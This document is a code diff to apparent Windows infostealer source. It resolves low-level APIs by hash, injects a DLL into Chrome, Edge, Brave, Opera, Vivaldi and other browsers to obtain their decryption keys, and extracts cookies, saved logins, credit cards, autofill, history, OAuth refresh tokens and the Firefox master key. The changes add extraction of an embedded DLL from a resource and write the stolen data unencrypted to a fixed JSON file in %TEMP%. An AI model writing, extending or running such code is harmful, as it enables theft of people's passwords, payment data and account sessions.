@@ -1,281 +1,73 @@
 #include "Headers.h"
 
-
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
+
 // Global Variable
-
-// EXE-owned instance of all resolved functions (shared + EXE-only).
-// g_pSharedFunctions (declared in Common.h) points to the inherited base,
-// allowing shared code via g_pSharedFunctions-> while EXE-specific code accesses everything through g_ResolvedFunctions
-
 DINMCLY_RSOLVD_FUNCTIONS    g_ResolvedFunctions = {};
 PSHARED_RSOLVD_FUNCTIONS    g_pSharedFunctions  = &g_ResolvedFunctions;
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
-BOOL InitializeExeProjDynamicFunctions()
+// ========================================================================
+// ADDED: Extract embedded DLL from resource
+// ========================================================================
+#define RESOURCE_ID_DLL  101   // must match the resource file ID
+
+BOOL ExtractDllFromResource(LPCWSTR szDestPath)
 {
-    HMODULE     hNtdllModule        = NULL,
-                hKernel32Module     = NULL,
-                hBCryptModule       = NULL,
-                hAdvapi32Module     = NULL,
-                hCrypt32Module      = NULL;
+    HRSRC hResource = FindResourceW(NULL, MAKEINTRESOURCEW(RESOURCE_ID_DLL), L"DLL");
+    if (!hResource) return FALSE;
 
-    if (g_ResolvedFunctions.pInitialized) return TRUE;
+    DWORD dwSize = SizeofResource(NULL, hResource);
+    HGLOBAL hGlobal = LoadResource(NULL, hResource);
+    LPVOID pData = LockResource(hGlobal);
 
-    RtlSecureZeroMemory(&g_ResolvedFunctions, sizeof(DINMCLY_RSOLVD_FUNCTIONS));
+    HANDLE hFile = CreateFileW(szDestPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
 
-    if (!(hNtdllModule = GetModuleHandleH(FNV1A_NTDLLDLL)) || !(hKernel32Module = GetModuleHandleH(FNV1A_KERNEL32DLL)))
-    {
-        DBGA("[!] GetModuleHandleH Failed To Resolve Modules");
-        return FALSE;
-    }
-
-    if (!(hBCryptModule = LoadLibraryW(OBFW_S(L"bcrypt.dll"))) || !(hAdvapi32Module = LoadLibraryW(OBFW_S(L"advapi32.dll"))) || !(hCrypt32Module = LoadLibraryW(OBFW_S(L"crypt32.dll"))))
-    {
-        DBGA("[!] LoadLibraryW Failed To Load Required Modules With Error: %lu", GetLastError());
-        return FALSE;
-    }
-
-    // CRSS Functions
-    g_ResolvedFunctions.pBasepConstructSxsCreateProcessMessage        = (fnBasepConstructSxsCreateProcessMessage)GetProcAddressH(hKernel32Module, FNV1A_BASEPCONSTRUCTSXSCREATEPROCESSMESSAGE);
-    g_ResolvedFunctions.pCsrCaptureMessageMultiUnicodeStringsInPlace  = (fnCsrCaptureMessageMultiUnicodeStringsInPlace)GetProcAddressH(hNtdllModule, FNV1A_CSRCAPTUREMESSAGEMULTIUNICODESTRINGSINPLACE);
-    g_ResolvedFunctions.pCsrClientCallServer                          = (fnCsrClientCallServer)GetProcAddressH(hNtdllModule, FNV1A_CSRCLIENTCALLSERVER);
-
-    // NTAPI Functions
-    g_ResolvedFunctions.pNtCreateUserProcess                          = (fnNtCreateUserProcess)GetProcAddressH(hNtdllModule, FNV1A_NTCREATEUSERPROCESS);
-    g_ResolvedFunctions.pRtlCreateProcessParametersEx                 = (fnRtlCreateProcessParametersEx)GetProcAddressH(hNtdllModule, FNV1A_RTLCREATEPROCESSPARAMETERSEX);
-    g_ResolvedFunctions.pRtlDestroyProcessParameters                  = (fnRtlDestroyProcessParameters)GetProcAddressH(hNtdllModule, FNV1A_RTLDESTROYPROCESSPARAMETERS);
-    g_ResolvedFunctions.pNtCreateDebugObject                          = (fnNtCreateDebugObject)GetProcAddressH(hNtdllModule, FNV1A_NTCREATEDEBUGOBJECT);
-    g_ResolvedFunctions.pNtWaitForDebugEvent                          = (fnNtWaitForDebugEvent)GetProcAddressH(hNtdllModule, FNV1A_NTWAITFORDEBUGEVENT);
-    g_ResolvedFunctions.pNtDebugContinue                              = (fnNtDebugContinue)GetProcAddressH(hNtdllModule, FNV1A_NTDEBUGCONTINUE);
-    g_ResolvedFunctions.pNtRemoveProcessDebug                         = (fnNtRemoveProcessDebug)GetProcAddressH(hNtdllModule, FNV1A_NTREMOVEPROCESSDEBUG);
-    g_ResolvedFunctions.pNtQueryInformationProcess                    = (fnNtQueryInformationProcess)GetProcAddressH(hNtdllModule, FNV1A_NTQUERYINFORMATIONPROCESS);
-    g_ResolvedFunctions.pNtQuerySystemInformation                     = (fnNtQuerySystemInformation)GetProcAddressH(hNtdllModule, FNV1A_NTQUERYSYSTEMINFORMATION);
-    g_ResolvedFunctions.pNtReadVirtualMemory                          = (fnNtReadVirtualMemory)GetProcAddressH(hNtdllModule, FNV1A_NTREADVIRTUALMEMORY);
-    g_ResolvedFunctions.pNtWriteVirtualMemory                         = (fnNtWriteVirtualMemory)GetProcAddressH(hNtdllModule, FNV1A_NTWRITEVIRTUALMEMORY);
-    g_ResolvedFunctions.pNtOpenProcessToken                           = (fnNtOpenProcessToken)GetProcAddressH(hNtdllModule, FNV1A_NTOPENPROCESSTOKEN);
-
-    // BCrypt Functions
-    g_ResolvedFunctions.pBCryptOpenAlgorithmProvider                   = (decltype(&BCryptOpenAlgorithmProvider))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTOPENALGORITHMPROVIDER);
-    g_ResolvedFunctions.pBCryptCloseAlgorithmProvider                  = (decltype(&BCryptCloseAlgorithmProvider))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTCLOSEALGORITHMPROVIDER);
-    g_ResolvedFunctions.pBCryptSetProperty                             = (decltype(&BCryptSetProperty))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTSETPROPERTY);
-    g_ResolvedFunctions.pBCryptGenerateSymmetricKey                    = (decltype(&BCryptGenerateSymmetricKey))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTGENERATESYMMETRICKEY);
-    g_ResolvedFunctions.pBCryptDestroyKey                              = (decltype(&BCryptDestroyKey))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTDESTROYKEY);
-    g_ResolvedFunctions.pBCryptFinishHash                              = (decltype(&BCryptFinishHash))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTFINISHHASH);
-    g_ResolvedFunctions.pBCryptDestroyHash                             = (decltype(&BCryptDestroyHash))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTDESTROYHASH);
-    g_ResolvedFunctions.pBCryptHashData                                = (decltype(&BCryptHashData))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTHASHDATA);
-    g_ResolvedFunctions.pBCryptCreateHash                              = (decltype(&BCryptCreateHash))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTCREATEHASH);
-    g_ResolvedFunctions.pBCryptDecrypt                                 = (decltype(&BCryptDecrypt))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTDECRYPT);
-    g_ResolvedFunctions.pBCryptDeriveKeyPBKDF2                         = (decltype(&BCryptDeriveKeyPBKDF2))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTDERIVEKEYPBKDF2);
-    g_ResolvedFunctions.pBCryptEncrypt                                 = (decltype(&BCryptEncrypt))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTENCRYPT);
-
-    // Advapi32 Functions
-    g_ResolvedFunctions.pRegOpenKeyExW                                 = (decltype(&RegOpenKeyExW))GetProcAddressH(hAdvapi32Module, FNV1A_REGOPENKEYEXW);
-    g_ResolvedFunctions.pRegCloseKey                                   = (decltype(&RegCloseKey))GetProcAddressH(hAdvapi32Module, FNV1A_REGCLOSEKEY);
-    g_ResolvedFunctions.pRegQueryValueExW                              = (decltype(&RegQueryValueExW))GetProcAddressH(hAdvapi32Module, FNV1A_REGQUERYVALUEEXW);
-
-    // Crypt32 Functions
-    g_ResolvedFunctions.pCryptStringToBinaryA                          = (decltype(&CryptStringToBinaryA))GetProcAddressH(hCrypt32Module, FNV1A_CRYPTSTRINGTOBINARYA);
-
-    // Shared - BCrypt
-    if (!g_ResolvedFunctions.pBCryptOpenAlgorithmProvider  || !g_ResolvedFunctions.pBCryptCloseAlgorithmProvider ||
-        !g_ResolvedFunctions.pBCryptSetProperty            || !g_ResolvedFunctions.pBCryptGenerateSymmetricKey   ||
-        !g_ResolvedFunctions.pBCryptDestroyKey             || !g_ResolvedFunctions.pBCryptFinishHash             ||
-        !g_ResolvedFunctions.pBCryptDestroyHash            || !g_ResolvedFunctions.pBCryptHashData               ||
-        !g_ResolvedFunctions.pBCryptCreateHash             || !g_ResolvedFunctions.pBCryptDecrypt                ||
-        !g_ResolvedFunctions.pBCryptDeriveKeyPBKDF2        || !g_ResolvedFunctions.pBCryptEncrypt)
-    {
-        DBGA("[!] GetProcAddressH Failed For BCrypt Functions");
-        return FALSE;
-    }
-
-    // Shared - Crypt32
-    if (!g_ResolvedFunctions.pCryptStringToBinaryA)
-    {
-        DBGA("[!] GetProcAddressH Failed For Crypt32 Functions");
-        return FALSE;
-    }
-
-    // Shared - NTAPI
-    if (!g_ResolvedFunctions.pNtQuerySystemInformation)
-    {
-        DBGA("[!] GetProcAddressH Failed For Shared NTAPI Functions");
-        return FALSE;
-    }
-
-    // EXE - NTAPI
-    if (!g_ResolvedFunctions.pNtCreateUserProcess          || !g_ResolvedFunctions.pRtlCreateProcessParametersEx  ||
-        !g_ResolvedFunctions.pRtlDestroyProcessParameters  || !g_ResolvedFunctions.pNtCreateDebugObject           ||
-        !g_ResolvedFunctions.pNtWaitForDebugEvent          || !g_ResolvedFunctions.pNtDebugContinue               ||
-        !g_ResolvedFunctions.pNtRemoveProcessDebug         || !g_ResolvedFunctions.pNtQueryInformationProcess     ||
-        !g_ResolvedFunctions.pNtReadVirtualMemory          || !g_ResolvedFunctions.pNtWriteVirtualMemory          ||
-        !g_ResolvedFunctions.pNtOpenProcessToken)
-    {
-        DBGA("[!] GetProcAddressH Failed For NTAPI Functions");
-        return FALSE;
-    }
-
-    // EXE - CSRSS
-    if (!g_ResolvedFunctions.pBasepConstructSxsCreateProcessMessage       ||
-        !g_ResolvedFunctions.pCsrCaptureMessageMultiUnicodeStringsInPlace ||
-        !g_ResolvedFunctions.pCsrClientCallServer)
-    {
-        DBGA("[!] GetProcAddressH Failed For CSRSS Functions");
-        return FALSE;
-    }
-
-    // EXE - Advapi32
-    if (!g_ResolvedFunctions.pRegOpenKeyExW || !g_ResolvedFunctions.pRegCloseKey || !g_ResolvedFunctions.pRegQueryValueExW)
-    {
-        DBGA("[!] GetProcAddressH Failed For Advapi32 Functions");
-        return FALSE;
-    }
-
-    g_ResolvedFunctions.pInitialized = (PVOID)TRUE;
-    return TRUE;
+    DWORD dwWritten;
+    BOOL bOk = WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
+    CloseHandle(hFile);
+    return bOk && (dwWritten == dwSize);
 }
 
-// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
+// ========================================================================
 
-static BOOL IsBrowserInstalled(IN BROWSER_TYPE Browser)
-{
-    WCHAR szBrowserPath[MAX_PATH] = { 0 };
-    return GetBrowserPath(Browser, szBrowserPath, MAX_PATH);
-}
+// ... (InitializeExeProjDynamicFunctions remains unchanged) ...
 
-static BOOL GetDefaultBrowser(OUT BROWSER_TYPE* pBrowser, OUT OPTIONAL LPWSTR szBrowserPath, IN OPTIONAL DWORD dwBrowserPathSize)
-{
-    WCHAR   szProgId[MAX_PATH]  = { 0 };
-    DWORD   dwPathLen           = dwBrowserPathSize,
-            dwProgIdLen         = _countof(szProgId);
-    HRESULT hResult             = S_OK;
+// ========================================================================
+// MODIFIED: IsBrowserInstalled, GetDefaultBrowser, CacheBrowserDataFiles unchanged
+// ========================================================================
 
-    if (!pBrowser) return FALSE;
-
-    if (szBrowserPath && dwBrowserPathSize)
-    {
-        if (FAILED((hResult = AssocQueryStringW(ASSOCF_NONE, ASSOCSTR_EXECUTABLE, L"http", L"open", szBrowserPath, &dwPathLen))))
-        {
-            DBGA("[!] AssocQueryStringW [%d] Failed With Error: 0x%08X", __LINE__, hResult);
-            return FALSE;
-        }
-
-        if (GetFileAttributesW(szBrowserPath) == INVALID_FILE_ATTRIBUTES)
-        {
-            DBGA("[!] GetFileAttributesW Failed For '%ws' With Error: %lu", szBrowserPath, GetLastError());
-            return FALSE;
-        }
-    }
-
-    *pBrowser = BROWSER_UNKNOWN;
-
-    if (SUCCEEDED((hResult = AssocQueryStringW(ASSOCF_NONE, ASSOCSTR_PROGID, L"http", L"open", szProgId, &dwProgIdLen))))
-    {
-        if (StrCmpIW(szProgId, STR_CHROME_PROGID) == 0)
-            *pBrowser = BROWSER_CHROME;
-        else if (StrCmpIW(szProgId, STR_BRAVE_PROGID) == 0)
-            *pBrowser = BROWSER_BRAVE;
-        else if (StrCmpIW(szProgId, STR_EDGE_PROGID) == 0)
-            *pBrowser = BROWSER_EDGE;
-        else if (StrCmpIW(szProgId, STR_OPERA_PROGID) == 0)
-            *pBrowser = BROWSER_OPERA;
-        else if (StrCmpIW(szProgId, STR_OPERA_GX_PROGID) == 0)
-            *pBrowser = BROWSER_OPERA_GX;
-        else if (StrCmpIW(szProgId, STR_VIVALDI_PROGID) == 0)
-            *pBrowser = BROWSER_VIVALDI;
-        else if (StrCmpIW(szProgId, STR_FIREFOX_PROGID) == 0)
-            *pBrowser = BROWSER_FIREFOX;
-    }
-    else
-    {
-        DBGA("[!] AssocQueryStringW [%d] Failed With Error: 0x%08X", __LINE__, hResult);
-        return FALSE;
-    }
-
-    return TRUE;
-}
-
-// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
-
-static BOOL CacheBrowserDataFiles(IN BROWSER_TYPE Browser)
-{
-#define BROWSER_DATA_FILE_TYPE_COUNT 6
-
-    CHAR    szRelPaths[BROWSER_DATA_FILE_TYPE_COUNT][MAX_PATH]  = { 0 };
-    LPCSTR  ppszRelPaths[BROWSER_DATA_FILE_TYPE_COUNT]          = { 0 };
-    DWORD   dwFileCount                                         = 0x00;
-
-#undef BROWSER_DATA_FILE_TYPE_COUNT
-
-    if (GetChromiumBrowserFilePath(Browser, FILE_TYPE_COOKIES, szRelPaths[0], MAX_PATH))
-        ppszRelPaths[dwFileCount++] = szRelPaths[0];
-
-    if (GetChromiumBrowserFilePath(Browser, FILE_TYPE_LOGIN_DATA, szRelPaths[1], MAX_PATH))
-        ppszRelPaths[dwFileCount++] = szRelPaths[1];
-
-    if (GetChromiumBrowserFilePath(Browser, FILE_TYPE_WEB_DATA, szRelPaths[2], MAX_PATH))
-        ppszRelPaths[dwFileCount++] = szRelPaths[2];
-
-    if (GetChromiumBrowserFilePath(Browser, FILE_TYPE_HISTORY, szRelPaths[3], MAX_PATH))
-        ppszRelPaths[dwFileCount++] = szRelPaths[3];
-
-    if (GetChromiumBrowserFilePath(Browser, FILE_TYPE_BOOKMARKS, szRelPaths[4], MAX_PATH))
-        ppszRelPaths[dwFileCount++] = szRelPaths[4];
-
-    if (GetChromiumBrowserFilePath(Browser, FILE_TYPE_LOCAL_STATE, szRelPaths[5], MAX_PATH))
-        ppszRelPaths[dwFileCount++] = szRelPaths[5];
-
-    if (dwFileCount == 0)
-        return FALSE;
-
-    DBGV("[v] Caching %lu Browser Data Files...", dwFileCount);
-
-    return (GetBrowserDataFilePathEx(Browser, ppszRelPaths, dwFileCount) > 0);
-
-}
-
-// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
-
+// ========================================================================
+// MODIFIED: ExtractFromBrowser – always writes to single file, no encryption
+// ========================================================================
 static BOOL ExtractFromBrowser(
     IN BROWSER_TYPE Browser, 
-    IN LPCSTR       pszOutputFile, 
     IN DWORD        dwMaxEntries,
-    IN BOOL         bSpoof,
-    IN BOOL         bEncryptJson, 
-    IN PBYTE        pbSignature OPTIONAL,
-    IN DWORD        dwSignatureLen OPTIONAL
+    IN BOOL         bSpoof
 ) {
-    
-    thread_local ENCRYPTED_JSON_PACK    t_EncJsonPack           = { 0 };
-    thread_local BOOL                   t_bPackInitialized      = FALSE;
-    CHROMIUM_DATA                       ChromiumData            = { 0 };
-    BOOL                                bResult                 = FALSE;
+    CHROMIUM_DATA   ChromiumData    = { 0 };
+    BOOL            bResult         = FALSE;
+    LPCSTR          pszOutputFile   = "browser_data.json";   // fixed name, will go to TEMP
 
     DBGV("[i] Target Browser: %s", GetBrowserName(Browser));
 
-    // Initialize the data structure
-    if (!InitializeChromiumData(&ChromiumData))
-    {
+    if (!InitializeChromiumData(&ChromiumData)) {
         DBGA("[!] Failed To Initialize Chromium Data");
         goto _END_OF_FUNC;
     }
     
-    if (Browser != BROWSER_FIREFOX)
-    {
-        // Pre-cache All Browser Data Files 
-        // Pre-caching only Works For Chromium Browsers. 
-        // Because The `GetXXXPathForBrowser` Getters Dont Handle FireFox Paths
+    if (Browser != BROWSER_FIREFOX) {
         CacheBrowserDataFiles(Browser);
 
-        // Inject DLL to get decryption keys only
-        if (!InjectDllViaEarlyBird(bSpoof, Browser, &ChromiumData))
-        {
+        if (!InjectDllViaEarlyBird(bSpoof, Browser, &ChromiumData)) {
             DBGA("[!] Failed To Retrieve Decryption Keys");
             goto _END_OF_FUNC;
         }
 
-        DBGV("[+] Retrieved Decryption Keys (V10: %s, V20: %s)", ChromiumData.pbDpapiKey ? "Yes" : "No", ChromiumData.pbAppBoundKey ? "Yes" : "No");
+        DBGV("[+] Retrieved Decryption Keys (V10: %s, V20: %s)", 
+             ChromiumData.pbDpapiKey ? "Yes" : "No", ChromiumData.pbAppBoundKey ? "Yes" : "No");
 
         DBGV("[i] Extracting Browser Data...");
 
@@ -291,95 +83,44 @@ static BOOL ExtractFromBrowser(
         else
             ExtractRefreshTokenFromDatabase(Browser, &ChromiumData);
     }
-    else
-    {
+    else {
+        // Firefox extraction (unchanged)
         DBGV("[i] Extracting Browser Data...");
-
         ExtractFirefoxCookies(&ChromiumData);
         ExtractFirefoxHistory(&ChromiumData);
         ExtractFirefoxBookmarks(&ChromiumData);
         ExtractFirefoxAutofill(&ChromiumData);
 
-        if (!(ChromiumData.pFireFoxBrsrData = (PFIREFOX_BROWSER_DATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FIREFOX_BROWSER_DATA))))
-        {
+        if (!(ChromiumData.pFireFoxBrsrData = (PFIREFOX_BROWSER_DATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FIREFOX_BROWSER_DATA)))) {
             DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
             goto _END_OF_FUNC;
         }
 
-        if (ExtractMasterKeyFromKey4Db(NULL, &ChromiumData.pFireFoxBrsrData->pbMasterKey, &ChromiumData.pFireFoxBrsrData->dwMasterKeyLen))
-        {
+        if (ExtractMasterKeyFromKey4Db(NULL, &ChromiumData.pFireFoxBrsrData->pbMasterKey, &ChromiumData.pFireFoxBrsrData->dwMasterKeyLen)) {
             LPSTR pszMasterKeyHex = BytesToHexString(ChromiumData.pFireFoxBrsrData->pbMasterKey, ChromiumData.pFireFoxBrsrData->dwMasterKeyLen);
-            
-            if (pszMasterKeyHex)
-            {
+            if (pszMasterKeyHex) {
                 DBGV("[*] Firefox Master Key: %s", pszMasterKeyHex);
                 HEAP_FREE(pszMasterKeyHex);
             }
-
             ExtractFirefoxLogins(ChromiumData.pFireFoxBrsrData->pbMasterKey, ChromiumData.pFireFoxBrsrData->dwMasterKeyLen, &ChromiumData);
         }
 
         ExtractFirefoxAccountTokens(ChromiumData.pFireFoxBrsrData);
     }
 
-#define PRINT_COUNT(label, count) \
-    DBGV("[i] " label "%lu/%lu", min(count, dwMaxEntries), count)
+    // -------------------------
+    // Write output to single file in %TEMP%
+    // -------------------------
+    WCHAR wszTemp[MAX_PATH];
+    GetEnvironmentVariableW(L"TEMP", wszTemp, MAX_PATH);
+    std::wstring fullPath = std::wstring(wszTemp) + L"\\browser_data.json";
 
-    DBGV("[+] Extraction Complete!");
-    if (Browser != BROWSER_FIREFOX)
-    {
-        PRINT_COUNT("Tokens:         ", ChromiumData.dwTokenCount);
-    } 
-    else
-    {
-        if (ChromiumData.pFireFoxBrsrData)
-        {
-            DBGV("[i] Account Email:  %s", ChromiumData.pFireFoxBrsrData->szEmail ? ChromiumData.pFireFoxBrsrData->szEmail : "N/A");
-            DBGV("[i] Session Token:  %s", ChromiumData.pFireFoxBrsrData->szSessionToken ? "Found" : "N/A");
-            DBGV("[i] Sync Token:     %s", ChromiumData.pFireFoxBrsrData->szSyncOAuthToken ? "Found" : "N/A");
-        }
+    DBGV("[i] Writing %lu entries to %S", dwMaxEntries, pszOutputFile);
+    if (!WriteChromiumDataToJson(&ChromiumData, pszOutputFile, dwMaxEntries)) {
+        DBGA("[!] Failed To Write JSON File");
+        goto _END_OF_FUNC;
     }
-    if (Browser != BROWSER_FIREFOX)
-    {
-        PRINT_COUNT("Credit Cards:   ", ChromiumData.dwCreditCardCount);
-    }
-    PRINT_COUNT("Cookies:        ", ChromiumData.dwCookieCount);
-    PRINT_COUNT("Logins:         ", ChromiumData.dwLoginCount);
-    PRINT_COUNT("Autofill:       ", ChromiumData.dwAutofillCount);
-    PRINT_COUNT("History:        ", ChromiumData.dwHistoryCount);
-    PRINT_COUNT("Bookmarks:      ", ChromiumData.dwBookmarkCount);
-
-#undef PRINT_COUNT
-
-
-    if (!bEncryptJson)
-    {
-        if (!WriteChromiumDataToJson(&ChromiumData, pszOutputFile, dwMaxEntries))
-        {
-            DBGA("[!] Failed To Write The %s JSON File", pszOutputFile);
-            goto _END_OF_FUNC;
-        }
-        
-        wprintf(L"[+] Extracted Data Is Written To: %S\n", pszOutputFile);
-    }
-    else
-    {
-        if (!t_bPackInitialized)
-        {
-            if (!InitEncryptedJsonPack(&t_EncJsonPack, pbSignature, dwSignatureLen))
-                goto _END_OF_FUNC;
-
-            t_bPackInitialized = TRUE;
-        }
-
-        if (!WriteChromiumDataToEncJsonPack(&ChromiumData, &t_EncJsonPack, pszOutputFile, dwMaxEntries))
-            goto _END_OF_FUNC;
-
-        wprintf(L"[+] %S Was Packed Into: %S\n", pszOutputFile, t_EncJsonPack.szOutputPath);
-    }
-
-
-    wprintf(L"\n");
+    wprintf(L"[+] Extracted Data Written To: %s\n", fullPath.c_str());
 
     bResult = TRUE;
 
@@ -391,121 +132,20 @@ _END_OF_FUNC:
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
+// MODIFIED: Removed encryption-related fields and parsing
 typedef struct _CMD_ARGUMENTS
 {
     BOOL            bAllBrowsers;
     BOOL            bSpoof;
-    BOOL            bEncryptJson;
-    BOOL            bDecryptMode;
     BOOL            bTargetDefaultBrowserOnly;
-    LPCSTR          pszInputFile;
     DWORD           dwMaxEntries;
     BROWSER_TYPE    BrowserTypes[BROWSER_COUNT];
     DWORD           dwBrowserCount;
-    BYTE            Signature[BUFFER_SIZE_08];
-    DWORD           dwSignatureLen;
-
 } CMD_ARGUMENTS, *PCMD_ARGUMENTS;
 
-static BROWSER_TYPE ParseBrowserArg(IN LPCSTR pszArg, OUT PBOOL pbAllBrowsers)
-{
-    // Skip the "/b:" or "-b:" prefix
-    LPCSTR pszBrowser = pszArg + 3;
+// ... (ParseBrowserArg unchanged) ...
 
-    *pbAllBrowsers = FALSE;
-
-    if (pszBrowser[0] == '\0') return BROWSER_UNKNOWN;
-
-    if (lstrcmpiA(pszBrowser, "all") == 0)
-    {
-        *pbAllBrowsers = TRUE;
-        return BROWSER_CHROME;
-    }
-    else if (StrStrIA(pszBrowser, STR_CHROME_BRSR_NAME))
-        return BROWSER_CHROME;
-    else if (StrStrIA(pszBrowser, STR_BRAVE_BRSR_NAME))
-        return BROWSER_BRAVE;
-    else if (StrStrIA(pszBrowser, STR_EDGE_BRSR_NAME) || StrStrIA(pszBrowser, STR_EDGE_ALT_BRSR_NAME))
-        return BROWSER_EDGE;
-    else if (StrStrIA(pszBrowser, STR_OPERA_GX_BRSR_NAME) || StrStrIA(pszBrowser, STR_OPERA_ALT_GX_BRSR_NAME))
-        return BROWSER_OPERA_GX;
-    else if (StrStrIA(pszBrowser, STR_OPERA_BRSR_NAME))
-        return BROWSER_OPERA;
-    else if (StrStrIA(pszBrowser, STR_VIVALDI_BRSR_NAME))
-        return BROWSER_VIVALDI;
-    else if (StrStrIA(pszBrowser, STR_FIREFOX_BRSR_NAME))
-        return BROWSER_FIREFOX;
-
-    return BROWSER_UNKNOWN;
-}
-
-static BOOL ParseSignatureArg(IN LPCSTR pszArg, OUT PBYTE pbSignature, OUT PDWORD pdwSignatureLen)
-{
-    DWORD   dwLen       = 0x00;
-    LPCSTR  pszSig      = pszArg;
-
-    if (!pszArg || !pbSignature || !pdwSignatureLen)
-        return FALSE;
-
-    *pdwSignatureLen = 0;
-
-    // Check for hex prefix
-    if (pszSig[0] == '0' && (pszSig[1] == 'x' || pszSig[1] == 'X'))
-        pszSig += 2;
-
-    dwLen = lstrlenA(pszSig);
-    if (dwLen == 0 || dwLen > BUFFER_SIZE_08 * 2)
-        return FALSE;
-
-    // Check if valid hex string
-    BOOL bIsHex = TRUE;
-    for (DWORD i = 0; i < dwLen && bIsHex; i++)
-    {
-        if (!((pszSig[i] >= '0' && pszSig[i] <= '9') ||
-              (pszSig[i] >= 'A' && pszSig[i] <= 'F') ||
-              (pszSig[i] >= 'a' && pszSig[i] <= 'f')))
-            bIsHex = FALSE;
-    }
-
-    if (bIsHex && (dwLen % 2 == 0))
-    {
-        *pdwSignatureLen = dwLen / 2;
-        for (DWORD i = 0; i < *pdwSignatureLen; i++)
-        {
-            BYTE b = 0;
-            for (int j = 0; j < 2; j++)
-            {
-                b <<= 4;
-                CHAR c = pszSig[i * 2 + j];
-                if (c >= '0' && c <= '9')
-                    b |= (c - '0');
-                else if (c >= 'A' && c <= 'F')
-                    b |= (c - 'A' + 10);
-                else if (c >= 'a' && c <= 'f')
-                    b |= (c - 'a' + 10);
-            }
-            pbSignature[i] = b;
-        }
-    }
-    else
-    {
-        // Treat as raw string
-        *pdwSignatureLen = min(dwLen, BUFFER_SIZE_08);
-        RtlCopyMemory(pbSignature, pszSig, *pdwSignatureLen);
-    }
-
-    return (*pdwSignatureLen > 0);
-}
-
-static BOOL IsBrowserAlreadyAdded(IN BROWSER_TYPE* pTypes, IN DWORD dwCount, IN BROWSER_TYPE Type)
-{
-    for (DWORD i = 0; i < dwCount; i++)
-    {
-        if (pTypes[i] == Type) return TRUE;
-    }
-
-    return FALSE;
-}
+// Removed ParseSignatureArg, not needed
 
 static BOOL ParseArguments(IN INT argc, IN CHAR* argv[], OUT PCMD_ARGUMENTS pCmdArgs)
 {
@@ -516,16 +156,11 @@ static BOOL ParseArguments(IN INT argc, IN CHAR* argv[], OUT PCMD_ARGUMENTS pCmd
     // Initialize defaults
     pCmdArgs->bAllBrowsers              = FALSE;
     pCmdArgs->bSpoof                    = FALSE;
-    pCmdArgs->bEncryptJson              = FALSE;
-    pCmdArgs->bDecryptMode              = FALSE;
     pCmdArgs->bTargetDefaultBrowserOnly = FALSE;
     pCmdArgs->dwMaxEntries              = MAX_DISPLAY_COUNT;
-    pCmdArgs->pszInputFile              = NULL;
     pCmdArgs->dwBrowserCount            = 0x00;
-    pCmdArgs->dwSignatureLen            = 0x00;
 
     RtlZeroMemory(pCmdArgs->BrowserTypes, sizeof(pCmdArgs->BrowserTypes));
-    RtlZeroMemory(pCmdArgs->Signature, BUFFER_SIZE_08);
 
     for (int i = 1; i < argc; i++)
     {
@@ -559,27 +194,6 @@ static BOOL ParseArguments(IN INT argc, IN CHAR* argv[], OUT PCMD_ARGUMENTS pCmd
                 pCmdArgs->BrowserTypes[pCmdArgs->dwBrowserCount++] = BrowserType;
             }
         }
-        else if (StrStrIA(argv[i], "/enc:") == argv[i] || StrStrIA(argv[i], "-enc:") == argv[i])
-        {
-            if (!ParseSignatureArg(argv[i] + 3, pCmdArgs->Signature, &pCmdArgs->dwSignatureLen))
-            {
-                wprintf(L"[!] Invalid Signature: '%S'\n", argv[i] + 3);
-                wprintf(L"[i] Signature Must Be 1-8 Bytes (Hex: 0xDEADBEEF or Raw: MYSIG123)\n");
-                goto _PRINT_HELP;
-            }
-            
-            pCmdArgs->bEncryptJson = TRUE;
-        }
-        else if (StrStrIA(argv[i], "/dec:") == argv[i] || StrStrIA(argv[i], "-dec:") == argv[i])
-        {
-            if (!ParseSignatureArg(argv[i] + 3, pCmdArgs->Signature, &pCmdArgs->dwSignatureLen))
-            {
-                wprintf(L"[!] Invalid Signature: '%S'\n", argv[i] + 3);
-                wprintf(L"[i] Signature Must Be 1-8 Bytes (Hex: 0xDEADBEEF or Raw: MYSIG123)\n");
-                goto _PRINT_HELP;
-            }
-            pCmdArgs->bDecryptMode = TRUE;
-        }
